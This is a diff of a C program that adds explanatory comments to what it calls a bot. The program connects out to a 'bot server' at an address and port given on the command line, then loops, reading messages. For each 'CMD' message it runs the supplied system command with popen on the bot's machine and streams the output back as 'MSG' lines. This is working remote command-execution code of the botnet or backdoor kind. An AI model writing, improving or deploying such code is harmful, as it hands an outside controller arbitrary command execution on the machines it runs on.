@@ -43,6 +43,7 @@ void print_help() {
     exit(EXIT_SUCCESS);
 }
 
+/* available command line arguments: short/long form and number of args */
 static struct option long_options[] = {
     {"port",    1, 0, 'p'},
     {"address", 1, 0, 'a'},
@@ -56,23 +57,33 @@ void run_icd(char *address, int port) {
     char buf[MAX_BUF], cmd[MAX_BUF], args[MAX_BUF], msg[MAX_BUF];
     FILE *fp;
 
+    /* validate port number */
     if (port < 1 || port > 65535) error("invalid port.");
 
+    /* connect to the provided address and port, the bot server */
     conn_sockfd = get_conn_sock(address, port);
 
+    /* listen indefinitely for incoming messages */
     while (1) {
+        /* read an incoming message from the bot server */
         memset(&buf, 0, sizeof(buf));
         err = read(conn_sockfd, buf, MAX_BUF);
         if (err == -1) error("read failed.");
+        /* lost connection with server */
         else if (err == 0) break;
 
+        /* parse the incoming messages as a single command followed by args */
         sscanf(buf, "%s %[^\n]", cmd, args);
 
+        /* CMD, a system command to be executed on the bot's machine */
         if (strcmp(cmd, "CMD") == 0) {
+            /* execute the command and open a pipe to the output */
             fp = popen(args, "r");
             if (fp == NULL) error("popen failed.");
 
+            /* read in the command's output */
             while (fgets(buf, MAX_BUF, fp) != NULL) {
+                /* send each line of output back as a MSG string for the user */
                 snprintf(msg, MAX_BUF, "MSG %s", buf);
                 err = write(conn_sockfd, msg, strlen(msg)); 
                 if (err == -1) error("write failed.");
@@ -90,21 +101,27 @@ int main(int argc, char **argv) {
     extern char *optarg;
     extern int optind;
     
+    /* parse all command line arguments */
     while (1) {
         int option_index = 0;
 
+        /* parse the next argument based on specified possible arguments */
         next_arg = getopt_long_only(argc, argv, "p:a:hv", long_options, &option_index);
 
+        /* done parsing arguments, move on */
         if (next_arg == -1) break;
 
         switch(next_arg) {
+            /* set destination port */
             case 'p': port = optarg; break;
+            /* set destination address */
             case 'a': address = optarg; break;
             case 'v': print_version(); break;
             case 'h': default: print_help(); break;
         }
     }
 
+    /* both address and port are required arguments */
     if (address == NULL || port == NULL) print_help();
 
     run_icd(address, atoi(port));
